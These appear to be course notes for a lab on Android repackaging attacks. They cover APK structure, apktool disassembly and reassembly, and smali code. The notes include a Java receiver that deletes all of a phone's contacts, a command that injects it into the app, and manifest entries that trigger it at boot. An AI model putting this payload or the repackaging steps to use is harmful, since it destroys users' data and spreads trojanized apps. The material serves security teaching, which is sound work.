# Week 8 Repackaging Attack and Rooting Attack

## Directory
- [Home](/README.md#table-of-contents)
- [Week 7 SQL Injection and Clickjacking](/week7/README.md#week-7-sql-injection-and-clickjacking)
- **&rarr;[Week 8 Repackaging Attack and Rooting Attack](/week8/README.md#week-8-repackaging-attack-and-rooting-attack)**
- [Week 9 Access Control](/week9/README.md#week-9-access-control)

## 8.2 Part 1: Android Repackacing Attack
([top](#directory))

## 8.3 How the Attack Works
([top](#directory))

### Computer Virus
  - program

||||
|-|-|-|
|jump to `malicious`||
||`program`||
||`malicious`|jump back to start of program|

### Overview of the Repackaging Attack

- download legit app
- disassemble, repackage them with malware
- upload to 3rd party app store

#### binary repackaging
- android uses binary repackaging

#### Binary restructuring
- exe
- need to understand the binary
- harder than Android binary code repackaging

## 8.4 Disassemble APK File
([top](#directory))

|||
|-|-|
|`android project`|java|
|`compile and packaging`||
|`android package (apk file)`|zip|
|`classed.dex`|zip|
|`resource.arsc`|zip|
|`uncompiled resources`|zip|
|`AndroidManifest.xml`|zip|
|sign APK developer's private key||

### APK Structure



- AndroidManifest.xml
- classes.dex
  - bytecode
- res/
- lib/ (sometimes)
- META-INF

#### Process

apk &rarr; unpack &rarr; classes.dex
- disassemble the dex file.
  - assembly code
  - add malware to assembly code
- reassemble to the code
  - modified classes.dex
- APK

### Disassemble the APK File (ubuntu)

#### Disassemble the APK file

```terminal
$ apktool d RepackagingLab.apk
```

#### Assemble the APK file

```terminal
$ apktool b [application_folder]
```

#### APK Structure after Disassembly

- `Android App Package` (APK)
  - `original`
    - `META-INF` (contains data that are used to ensure the integrity of the APK package and system security)
  - `res` (contains resource files, such as animation, color, images, layout etc)
    - `anim`
    - `colo`
    - `drawable`
    - `layout`
    - `values`
  - `smali`
    - `android` (contains android support library code decompiled in smali)
    - `com` (it contains application specific code decompiled in smali)
  - `AndroidManifest.xml` (contains information about app components, name, version, access rights, also references to library file and other)

### Smali Code (Assembly)

#### Java Code
```java
if (flagx==1)
  flagx=2
else
  flag=3
```

#### Smali Code

```smali
const/4 v1, 0x1
if-ne v0, v1, :cond_0
const/4 v2, 0x2
move v0,v2
goto :goto_0
:cond_0
const/4 v2, 0x3
move v0,v2
:goto_0
```

## 8.5 Writing Malicious Code
([top](#directory))

- Modify smali code
  - hard
- add an independent component
  - activity
    - ui
  - service
  - broadcast receiver
    - triggered by broadcast
    - `malicious`

### Malicious Code Example

```java
public class MaliciousCode extends BroadcastReceiver{
    @override
    public void onReceive(Context context, Intent intent){
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

        while(cursor.moveToNext()){
            String lookupKey = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.LOOKUP_NEXT));
            
            Uri uri = Uri.WithAppendedPath (ContactsContract.Contacts.CONTENT_LOOKUP_URI,lookupKey);
            contentResolver.delete(uri,null,null);
        }
    }
}
```

#### Inject the smali code

```
$ cp MaliciousCode.smali RepackagingLab/smali/com/
```


### Permission-Based Access Control for Android

- Android
  - ask permission abc
  - approved
  - if approved
    - install

#### Request More Permissions

*AndroidManifest.xml*
```xml
<manifest...>
  ...
  <uses-permission android:name="android.permission.READ_CONTACTS"/>
  <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
  <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>

  <application>
     ...
     <receiver android:name="com.MaliciousCode">
       <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
       </intent-filter>

     </receiver>
  </application>
</manifest>
```